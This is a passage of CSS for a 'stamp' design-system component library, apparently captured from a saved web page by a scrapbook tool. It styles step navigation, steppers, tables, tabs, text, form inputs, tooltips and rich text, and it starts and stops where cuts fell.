.stamp-step-navigation__steps { display: flex; flex-direction: row; list-style-type: none; margin-inline: var(--stamp-spacing-inner-s); margin-block-start: var(--stamp-spacing-outer-s); }

.stamp-step-navigation__label { text-align: center; font-weight: var(--stamp-text-step-default-font-weight); margin-block-start: var(--stamp-spacing-inner-s); }

.stamp-step-navigation__label--focused { color: var(--stamp-color-text-link-hover); }

.stamp-step-navigation__illustration { display: flex; justify-content: center; margin-block-end: var(--stamp-spacing-inner-s); }

.stamp-step-navigation__line { block-size: var(--stamp-border-width-m); flex-grow: 1; margin-block-start: 10px; }

.stamp-step-navigation__line--has-illustration { margin-block-start: calc(
        (var(--stamp-size-illustration-m) + 10px) + var(--stamp-spacing-inner-s)
    ); }

.stamp-step-navigation__line--todo { background-color: var(--stamp-color-border-strong); }

.stamp-step-navigation__line--done { background-color: var(--stamp-color-border-brand); }

@media (min-width: 768px) {
  .stamp-step-navigation__steps { margin-inline: var(--stamp-spacing-inner-l); margin-block-start: var(--stamp-spacing-outer-m); }
}

.stamp-step-navigation-step { position: relative; display: flex; flex-direction: column; text-align: center; z-index: var(--z-index-base); }

.stamp-step-navigation-step__step { position: relative; display: flex; flex-direction: row; justify-content: center; margin-block-end: calc(26px + var(--stamp-spacing-inner-s)); margin-block-start: 0px; }

.stamp-step-navigation-step__step--has-illustration { margin-block-start: calc(80px + var(--stamp-spacing-inner-s)); }

.stamp-step-navigation-step__step--single-label { margin-block-end: 0px; }

.stamp-step-navigation-step__step--todo .stamp-step-navigation-step__dot { inline-size: 20px; block-size: 20px; border-style: solid; border-color: var(--stamp-color-border-strong); border-width: 2px; background-color: var(--stamp-color-background-surface); }

.stamp-step-navigation-step__step--current .stamp-step-navigation-step__dot { position: relative; inline-size: 14px; block-size: 14px; box-shadow: 0 0 0 3px var(--stamp-color-background-surface),
        0 0 0 5px var(--stamp-color-icon-brand); margin: 3px; background-color: var(--stamp-color-icon-brand); }

.stamp-step-navigation-step__step--done .stamp-step-navigation-step__dot { display: flex; justify-content: center; align-items: center; overflow: hidden; inline-size: 20px; block-size: 20px; background-color: var(--stamp-color-icon-brand); }

.stamp-step-navigation-step__dot { display: inline-block; border-radius: 50%; }

.stamp-step-navigation-step__dot .stamp-icon { inline-size: 12px; block-size: 12px; color: var(--stamp-color-icon-accent-default); }

.stamp-step-navigation-step__button, .stamp-step-navigation-step__button[disabled] { position: absolute; display: flex; flex-direction: column; justify-content: center; align-items: center; background-color: transparent; transform: translateY(calc(-100% + 50px)); border: medium; cursor: pointer; color: inherit; }

.stamp-step-navigation-step__button:disabled { cursor: not-allowed; }

.stamp-step-navigation-step__button--single-label { position: absolute; inline-size: 100%; block-size: 100%; transform: unset; }

.stamp-step-navigation-step__button:hover:not(:disabled):not(:active) .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-default); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:hover:not(:disabled):not(:active)) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-hover); }

.stamp-step-navigation-step__button:active:not(:disabled):not(:focus) .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-pressed); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:active:not(:disabled):not(:focus)) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-pressed); box-shadow: 0 0 0 1px var(--stamp-color-background-surface),
        0 0 0 3px var(--stamp-color-icon-pressed); }

.stamp-step-navigation-step__button:focus { border: medium; outline: none; }

.stamp-step-navigation-step__button:focus .stamp-step-navigation-step__label { color: var(--stamp-color-text-link-hover); }

.stamp-step-navigation-step:has(.stamp-step-navigation-step__button:focus) .stamp-step-navigation-step__dot { background-color: var(--stamp-color-icon-hover); box-shadow: 0 0 0 1px var(--stamp-color-background-surface),
    0 0 0 3px var(--stamp-color-icon-hover); }

.stamp-step-navigation-step__label { display: flex; justify-content: center; block-size: 50px; padding-block-start: calc(26px + var(--stamp-spacing-inner-s)); letter-spacing: var(--stamp-text-step-default-letter-spacing); line-height: var(--stamp-text-step-default-line-height); font-family: var(--stamp-text-step-default-font-family); font-size: var(--stamp-text-step-default-font-size); font-weight: var(--stamp-text-step-default-font-weight); }

.stamp-step-navigation-step:first-of-type .stamp-step-navigation-step__label, .stamp-step-navigation-step:last-of-type .stamp-step-navigation-step__label { max-inline-size: 84px; }

.stamp-step-navigation-step__step--todo .stamp-step-navigation-step__label { letter-spacing: var(--stamp-text-step-todo-letter-spacing); line-height: var(--stamp-text-step-todo-line-height); font-family: var(--stamp-text-step-todo-font-family); font-size: var(--stamp-text-step-todo-font-size); font-weight: var(--stamp-text-step-todo-font-weight); }

.stamp-step-navigation-step__illustration-wrapper { display: flex; justify-content: center; block-size: fit-content; padding-block-end: var(--stamp-spacing-inner-l); }

.stamp-step-navigation-step__illustration { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xl); }

@media (min-width: 768px) {
  .stamp-step-navigation-step__illustration { aspect-ratio: var(--aspect-ratio-standard); inline-size: var(--stamp-size-illustration-xxl); }
}

.stamp-stepper { display: inline-flex; padding: 0px; margin: 0px; block-size: 32px; border-radius: var(--stamp-radius-s); max-inline-size: fit-content; border-width: var(--stamp-border-width-s); border-style: solid; border-color: var(--stamp-color-border-strong); }

.stamp-stepper--invalid, .stamp-stepper:has(input:invalid) { border-color: var(--stamp-color-border-error); }

.stamp-stepper__button { display: flex; justify-content: center; align-items: center; border-image: none; background: none; cursor: pointer; border-style: solid; border-color: transparent; inline-size: 32px; outline-offset: 1px; border-width: var(--stamp-border-width-s); margin: calc(var(--stamp-border-width-s) * -1); z-index: var(--z-index-base); }

.stamp-stepper__button:focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-stepper__button:focus { outline: none; }
  .stamp-stepper__button:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }
}

.stamp-stepper__button:first-of-type { border-radius: var(--stamp-radius-s) 0 0 var(--stamp-radius-s); }

.stamp-stepper__button:last-of-type { border-radius: 0 var(--stamp-radius-s) var(--stamp-radius-s) 0; }

.stamp-stepper__button:hover { border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-hover); z-index: var(--z-index-base); }

.stamp-stepper__button:active { border-color: var(--stamp-color-border-pressed); z-index: var(--z-index-base); }

.stamp-stepper__button:active .stamp-stepper__button-icon { color: var(--stamp-color-icon-pressed); }

.stamp-stepper__button:disabled { background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); cursor: not-allowed; border-style: solid; }

.stamp-stepper--invalid .stamp-stepper__button:disabled { border: medium; margin: 0px; inline-size: 30px; }

.stamp-stepper__button:disabled:first-of-type { z-index: var(--z-index-base); }

.stamp-stepper__button:disabled:last-of-type { z-index: var(--z-index-base); }

.stamp-stepper__button:disabled .stamp-stepper__button-icon { color: var(--stamp-color-icon-disabled); }

.stamp-stepper__button-icon { color: var(--stamp-color-text-icon-button-default); }

.stamp-stepper__input { max-inline-size: 30px; border-radius: 0px; border-block: medium; border-left-width: var(--stamp-border-width-s); border-left-style: solid; border-left-color: var(--stamp-color-border-strong); border-right-width: var(--stamp-border-width-s); border-right-style: solid; border-right-color: var(--stamp-color-border-strong); text-align: center; font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); font-weight: var(--stamp-text-body-m-default-font-weight); outline-color: var(--stamp-color-border-focus-outline); background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-stepper__input:focus { z-index: var(--z-index-base); outline-offset: 2px; outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }

@supports selector(:focus-visible) {
  .stamp-stepper__input:focus { outline: none; }
  .stamp-stepper__input:focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); }
}

.stamp-table { position: relative; background-color: var(--stamp-color-background-surface); }

.stamp-table::before, .stamp-table::after { content: &quot;&quot;; pointer-events: none; position: absolute; display: block; block-size: 100%; inline-size: 48px; top: 0px; opacity: 0; transition: opacity 0.1s ease-in-out; }

.stamp-table::before { inset-inline-start: 0px; background: linear-gradient(to right, var(--stamp-color-background-surface), transparent); }

.stamp-table::after { inset-inline-end: 0px; background: linear-gradient(to left, var(--stamp-color-background-surface), transparent); }

.stamp-table--overflow-start::before, .stamp-table--overflow-end::after { opacity: 1; }

.stamp-table table { border-collapse: collapse; border-spacing: 0px; color: var(--stamp-color-text-default); }

.stamp-table tr { border-block-end: var(--stamp-border-width-s) solid var(--stamp-color-border-default); }

.stamp-table td, .stamp-table th { padding: var(--stamp-spacing-inner-l); white-space: nowrap; background-color: var(--stamp-color-background-surface); }

.stamp-table th { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-table td { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-table--has-hover tr:hover td { background-color: var(--stamp-color-background-default); cursor: pointer; }

.stamp-table__scroll-container { inline-size: 100%; overflow: auto; border-radius: var(--stamp-radius-xs); }

.stamp-table__scroll-container:focus { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-table__scroll-container:focus { outline: none; }
  .stamp-table__scroll-container:focus-visible { outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-tab { scroll-snap-align: center; position: relative; padding-block: var(--stamp-spacing-inner-l); padding-inline: var(--stamp-spacing-inner-xl); border: medium; color: var(--stamp-color-text-default); background-color: transparent; cursor: pointer; display: flex; align-items: center; gap: var(--stamp-spacing-inner-s); border-block-end-width: ; border-block-end-style: solid; border-block-end-color: transparent; margin-block-end: calc(-1 * var(--stamp-border-width-s)); }

.stamp-tab:hover { border-block-end-color: var(--stamp-color-border-hover); }

.stamp-tab:active { border-block-end-color: var(--stamp-color-border-pressed); }

.stamp-tab:focus:not(:active) { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-s); }

@supports selector(:focus-visible) {
  .stamp-tab:focus:not(:active) { outline: none; }
  .stamp-tab:focus-visible:not(:active) { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-s); }
}

.stamp-tab[data-state=&quot;active&quot;]:not(:active)::before { content: &quot;&quot;; position: absolute; inline-size: 100%; background-color: var(--stamp-color-border-selected); block-size: var(--stamp-border-width-l); inset-block-end: 0px; inset-inline-start: 0px; margin-bottom: calc(-1 * var(--stamp-border-width-s)); }

.stamp-tab__indicator { display: flex; justify-content: center; align-items: center; border-radius: var(--stamp-radius-l); padding-block: 0px; padding-inline: var(--stamp-spacing-inner-s); block-size: 24px; inline-size: 100%; background-color: var(--stamp-color-background-strong); color: var(--stamp-color-text-inverse); font-family: var(--stamp-text-badge-default-font-family), sans-serif; font-weight: var(--stamp-text-badge-default-font-weight); line-height: var(--stamp-text-badge-default-line-height); font-size: var(--stamp-text-badge-default-font-size); letter-spacing: var(--stamp-text-badge-default-letter-spacing); }

.stamp-tab:hover .stamp-tab__indicator { background-color: var(--stamp-color-icon-hover); }

.stamp-tab:active .stamp-tab__indicator { background-color: var(--stamp-color-icon-pressed); }

.stamp-tab > .stamp-tab__indicator { background-color: var(--stamp-color-icon-selected); }

.stamp-tab__content { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); flex-grow: 1; white-space: nowrap; }

.stamp-tab__icon { display: flex; justify-content: center; align-items: center; max-inline-size: var(--stamp-size-icon-m); max-block-size: var(--stamp-size-icon-m); }

.stamp-tab__icon > svg { inline-size: var(--stamp-size-icon-m); block-size: var(--stamp-size-icon-m); }

.stamp-tab[data-state=&quot;active&quot;]:not(:active) > .stamp-tab__icon { color: var(--stamp-color-icon-selected); }

.stamp-tab:hover:not([data-state=&quot;active&quot;]) > .stamp-tab__icon { color: var(--stamp-color-icon-hover); }

.stamp-tab:active > .stamp-tab__icon { color: var(--stamp-color-icon-pressed); }

.stamp-tab-content { position: relative; z-index: var(--z-index-above); }

.stamp-tab-content:focus { outline-offset: 1px; outline-style: solid; outline-color: var(--stamp-color-border-focus-outline); outline-width: var(--stamp-border-width-m); border-radius: var(--stamp-radius-xs); }

.stamp-tab-list { position: relative; }

.stamp-tab-list__list { scroll-snap-type: x mandatory; scroll-behavior: smooth; overflow: auto hidden; border-block-end-width: var(--stamp-border-width-s); border-block-end-style: solid; border-block-end-color: var(--stamp-color-border-default); display: flex; scrollbar-width: none; }

.stamp-tab-list__list::-webkit-scrollbar { display: none; }

.stamp-tab-list__fade { position: absolute; z-index: var(--z-index-above); inset-block: 0px 1px; display: flex; align-items: center; pointer-events: none; }

.stamp-tab-list__fade--start::after, .stamp-tab-list__fade--end::before { content: &quot;&quot;; display: block; width: 24px; height: 100%; }

.stamp-tab-list__fade--start::after { background: var(--stamp-color-overflow-inline-start); }

.stamp-tab-list__fade--end::before { background: var(--stamp-color-overflow-inline-end); }

.stamp-tab-list__fade--start { inset-inline-start: 0px; }

.stamp-tab-list__fade--end { inset-inline-end: 0px; }

.stamp-tab-list .stamp-icon-button { padding-inline: var(--stamp-spacing-inner-m); height: 52px; width: 100%; background: var(--stamp-color-background-surface); margin-block-end: 1px; pointer-events: auto; }

.stamp-text { color: var(--stamp-color-text-default); }

.stamp-text--variant-default { color: var(--stamp-color-text-default); }

.stamp-text--variant-subtle { color: var(--stamp-color-text-subtle); }

.stamp-text--size-s { font-family: var(--stamp-text-body-s-default-font-family), sans-serif; font-weight: var(--stamp-text-body-s-default-font-weight); line-height: var(--stamp-text-body-s-default-line-height); font-size: var(--stamp-text-body-s-default-font-size); letter-spacing: var(--stamp-text-body-s-default-letter-spacing); }

.stamp-text--size-m { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-text--size-l { font-family: var(--stamp-text-body-l-default-font-family), sans-serif; font-weight: var(--stamp-text-body-l-default-font-weight); line-height: var(--stamp-text-body-l-default-line-height); font-size: var(--stamp-text-body-l-default-font-size); letter-spacing: var(--stamp-text-body-l-default-letter-spacing); }

.stamp-text--variant-subtitle { color: var(--stamp-color-text-default); }

.stamp-text--variant-subtitle.stamp-text--size-s { font-family: var(--stamp-text-subtitle-s-font-family); font-weight: var(--stamp-text-subtitle-s-font-weight); line-height: var(--stamp-text-subtitle-s-line-height); font-size: var(--stamp-text-subtitle-s-font-size); letter-spacing: var(--stamp-text-subtitle-s-letter-spacing); }

.stamp-text--variant-subtitle.stamp-text--size-m { font-family: var(--stamp-text-subtitle-m-font-family); font-weight: var(--stamp-text-subtitle-m-font-weight); line-height: var(--stamp-text-subtitle-m-line-height); font-size: var(--stamp-text-subtitle-m-font-size); letter-spacing: var(--stamp-text-subtitle-m-letter-spacing); }

.stamp-text--variant-subtitle.stamp-text--size-l { font-family: var(--stamp-text-subtitle-l-font-family); font-weight: var(--stamp-text-subtitle-l-font-weight); line-height: var(--stamp-text-subtitle-l-line-height); font-size: var(--stamp-text-subtitle-l-font-size); letter-spacing: var(--stamp-text-subtitle-l-letter-spacing); }

.stamp-text a { color: var(--stamp-color-text-link-default); text-decoration-thickness: 1px; }

.stamp-text a:hover { color: var(--stamp-color-text-link-hover); }

.stamp-text a:active { color: var(--stamp-color-text-link-pressed); }

.stamp-text a:hover, .stamp-text a:active { text-decoration-thickness: 2px; }

.stamp-text a:focus { color: var(--stamp-color-text-link-default); }

.stamp-text a:focus { outline-color: var(--stamp-color-border-focus-outline); }

.stamp-text a:visited { color: var(--stamp-color-text-link-visited); }

.stamp-text--size-s strong { font-weight: bold; font-family: var(--stamp-text-body-s-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-s-emphasis-line-height); font-size: var(--stamp-text-body-s-emphasis-font-size); letter-spacing: var(--stamp-text-body-s-emphasis-letter-spacing); }

.stamp-text--size-s em { font-style: italic; font-family: var(--stamp-text-body-s-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-s-emphasis-line-height); font-size: var(--stamp-text-body-s-emphasis-font-size); letter-spacing: var(--stamp-text-body-s-emphasis-letter-spacing); }

.stamp-text--size-m strong { font-weight: bold; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-text--size-m em { font-style: italic; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-text--size-l strong { font-weight: bold; font-family: var(--stamp-text-body-l-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-l-emphasis-line-height); font-size: var(--stamp-text-body-l-emphasis-font-size); letter-spacing: var(--stamp-text-body-l-emphasis-letter-spacing); }

.stamp-text--size-l em { font-style: italic; font-family: var(--stamp-text-body-l-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-l-emphasis-line-height); font-size: var(--stamp-text-body-l-emphasis-font-size); letter-spacing: var(--stamp-text-body-l-emphasis-letter-spacing); }

.stamp-textarea-input { padding-inline: var(--stamp-spacing-inner-l); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); border-style: solid; resize: none; inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-textarea-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-textarea-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-textarea-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-textarea-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-textarea-input:not(:disabled):focus { outline: none; }
  .stamp-textarea-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-textarea-input:disabled { background-color: var(--stamp-color-background-disabled); cursor: not-allowed; border-color: var(--stamp-color-border-disabled); -webkit-text-fill-color: var(--stamp-color-text-default); color: var(--stamp-color-text-form-control-value-disabled); }

.stamp-textarea-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-textarea-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-textarea-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-textarea-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-textarea-input { inline-size: 50%; }
  .stamp-textarea-input--size-full { inline-size: 100%; }
}

.stamp-text-input { padding-inline: var(--stamp-spacing-inner-l); padding-block: var(--stamp-spacing-inner-s); border-width: var(--stamp-border-width-s); border-color: var(--stamp-color-border-strong); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); border-radius: var(--stamp-radius-s); font-weight: var(--stamp-text-body-m-default-font-weight); border-style: solid; inline-size: 100%; background-color: var(--stamp-color-background-surface); color: var(--stamp-color-text-form-control-value-default); }

.stamp-text-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-text-input::placeholder { color: var(--stamp-color-text-form-control-placeholder-default); opacity: 1; }

.stamp-text-input:not(:disabled):hover { border-color: var(--stamp-color-border-hover); }

.stamp-text-input:not(:disabled):focus { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }

@supports selector(:focus-visible) {
  .stamp-text-input:not(:disabled):focus { outline: none; }
  .stamp-text-input:not(:disabled):focus-visible { outline-color: var(--stamp-color-border-focus-outline); outline-style: solid; outline-width: var(--stamp-border-width-m); outline-offset: 1px; }
}

.stamp-text-input:disabled { background-color: var(--stamp-color-background-disabled); border-color: var(--stamp-color-border-disabled); -webkit-text-fill-color: var(--stamp-color-text-default); color: var(--stamp-color-text-form-control-value-disabled); cursor: not-allowed; }

.stamp-text-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-text-input:disabled::placeholder { color: var(--stamp-color-text-form-control-placeholder-disabled); }

.stamp-text-input--invalid { border-color: var(--stamp-color-border-error); }

.stamp-text-input--size-narrow { inline-size: 50%; }

.stamp-text-input--size-full { inline-size: 100%; }

@media (min-width: 481px) {
  .stamp-text-input { inline-size: 50%; }
  .stamp-text-input--size-narrow { inline-size: 25%; }
  .stamp-text-input--size-full { inline-size: 100%; }
}

.stamp-tooltip__dismiss-button { position: absolute; inset-inline-end: var(--stamp-spacing-inner-m); inset-block-start: var(--stamp-spacing-inner-s); border: medium; cursor: pointer; }

.stamp-tooltip--down .stamp-tooltip__dismiss-button { inset-block-start: calc(var(--stamp-spacing-inner-m) + var(--tooth-size) * 2); }

.stamp-tooltip__content { position: relative; padding: var(--stamp-spacing-inner-l)
        calc(2 * var(--stamp-spacing-inner-l) + var(--stamp-size-icon-m))
        var(--stamp-spacing-inner-l) var(--stamp-spacing-inner-l); overflow: hidden; overflow-wrap: break-word; max-inline-size: 320px; inline-size: 100%; }

@media (max-width: 320px) {
  .stamp-tooltip__content { max-inline-size: 100vw; }
}

.stamp-tooltip__title { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-rich-text { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-size: var(--stamp-text-body-m-default-font-size); line-height: var(--stamp-text-body-m-default-line-height); color: var(--stamp-color-text-default); }

.stamp-rich-text p, .stamp-rich-text ul, .stamp-rich-text ol, .stamp-rich-text h1, .stamp-rich-text h2, .stamp-rich-text h3, .stamp-rich-text h4, .stamp-rich-text h5, .stamp-rich-text h6, .stamp-rich-text table { margin-bottom: var(--stamp-spacing-outer-xs); }

.stamp-rich-text ul { display: flex; flex-direction: column; gap: var(--stamp-spacing-inner-s); list-style-position: outside; list-style-type: disc; padding-inline-start: 18px; }

.stamp-rich-text ol { list-style-type: decimal; padding-inline-start: 14px; }

.stamp-rich-text li { font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); color: var(--stamp-color-text-default); }

.stamp-rich-text h1 { font-feature-settings: normal; letter-spacing: var(--stamp-text-heading-3-xl-letter-spacing); line-height: var(--stamp-text-heading-3-xl-line-height); font-weight: var(--stamp-text-heading-3-xl-font-weight); font-family: var(--stamp-text-heading-3-xl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

.stamp-rich-text h2 { letter-spacing: var(--stamp-text-heading-xxl-letter-spacing); line-height: var(--stamp-text-heading-xxl-line-height); font-weight: var(--stamp-text-heading-xxl-font-weight); font-family: var(--stamp-text-heading-xxl-font-family); font-size: var(--stamp-text-heading-xl-font-size); }

.stamp-rich-text h3 { letter-spacing: var(--stamp-text-heading-xl-letter-spacing); line-height: var(--stamp-text-heading-xl-line-height); font-weight: var(--stamp-text-heading-xl-font-weight); font-family: var(--stamp-text-heading-xl-font-family); font-size: var(--stamp-text-heading-l-font-size); }

.stamp-rich-text h4 { letter-spacing: var(--stamp-text-heading-l-letter-spacing); line-height: var(--stamp-text-heading-l-line-height); font-weight: var(--stamp-text-heading-l-font-weight); font-family: var(--stamp-text-heading-l-font-family); font-size: var(--stamp-text-heading-m-font-size); }

.stamp-rich-text h5 { letter-spacing: var(--stamp-text-heading-m-letter-spacing); line-height: var(--stamp-text-heading-m-line-height); font-weight: var(--stamp-text-heading-m-font-weight); font-family: var(--stamp-text-heading-m-font-family); font-size: var(--stamp-text-heading-s-font-size); }

.stamp-rich-text h6 { letter-spacing: var(--stamp-text-heading-s-letter-spacing); line-height: var(--stamp-text-heading-s-line-height); font-weight: var(--stamp-text-heading-s-font-weight); font-family: var(--stamp-text-heading-s-font-family); font-size: var(--stamp-text-heading-xs-font-size); }

@media (min-width: 681px) {
  .stamp-rich-text h1 { font-size: var(--stamp-text-heading-3-xl-font-size); }
  .stamp-rich-text h2 { font-size: var(--stamp-text-heading-xxl-font-size); }
  .stamp-rich-text h3 { font-size: var(--stamp-text-heading-xl-font-size); }
  .stamp-rich-text h4 { font-size: var(--stamp-text-heading-l-font-size); }
  .stamp-rich-text h5 { font-size: var(--stamp-text-heading-m-font-size); }
  .stamp-rich-text h6 { font-size: var(--stamp-text-heading-s-font-size); }
}

.stamp-rich-text a { color: var(--stamp-color-text-link-default); text-decoration-thickness: 1px; }

.stamp-rich-text a:visited { color: var(--stamp-color-text-link-visited); }

.stamp-rich-text a:focus { outline-color: var(--stamp-color-border-focus-outline); }

.stamp-rich-text a:focus { color: var(--stamp-color-text-link-default); }

.stamp-rich-text a:hover, .stamp-text a:active { text-decoration-thickness: 2px; }

.stamp-rich-text a:active { color: var(--stamp-color-text-link-pressed); }

.stamp-rich-text a:hover { color: var(--stamp-color-text-link-hover); }

.stamp-rich-text em { font-style: italic; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-rich-text strong { font-weight: bold; font-family: var(--stamp-text-body-m-emphasis-font-family), sans-serif; line-height: var(--stamp-text-body-m-emphasis-line-height); font-size: var(--stamp-text-body-m-emphasis-font-size); letter-spacing: var(--stamp-text-body-m-emphasis-letter-spacing); }

.stamp-rich-text table { position: relative; background-color: var(--stamp-color-background-surface); border-collapse: collapse; border-spacing: 0px; color: var(--stamp-color-text-default); }

.stamp-rich-text table tr { border-block-end: var(--stamp-border-width-s) solid var(--stamp-color-border-default); }

.stamp-rich-text table td, .stamp-rich-text table th { padding: var(--stamp-spacing-inner-l); white-space: nowrap; background-color: var(--stamp-color-background-surface); font-family: var(--stamp-text-body-m-default-font-family), sans-serif; font-weight: var(--stamp-text-body-m-default-font-weight); line-height: var(--stamp-text-body-m-default-line-height); font-size: var(--stamp-text-body-m-default-font-size); letter-spacing: var(--stamp-text-body-m-default-letter-spacing); }

.stamp-rich-text table th { font-family: var(--stamp-text-heading-xs-font-family), sans-serif; font-weight: var(--stamp-text-heading-xs-font-weight); line-height: var(--stamp-text-heading-xs-line-height); font-size: var(--stamp-text-heading-xs-font-size); letter-spacing: var(--stamp-text-heading-xs-letter-spacing); }

.stamp-button__icon svg { inline-size: 100%; block-size: 100%; }" data-scrapbook-adoptedstylesheet-6="@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

:host(*) { border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-block: initial; overflow-inline: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; contain-intrinsic-block-size: initial; contain-intrinsic-inline-size: initial; background: initial; background-blend-mode: initial; border: initial; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: initial; position: initial; float: initial; clear: initial; vertical-align: initial; baseline-source: initial; overflow: initial; overflow-anchor: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; scroll-snap-stop: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: 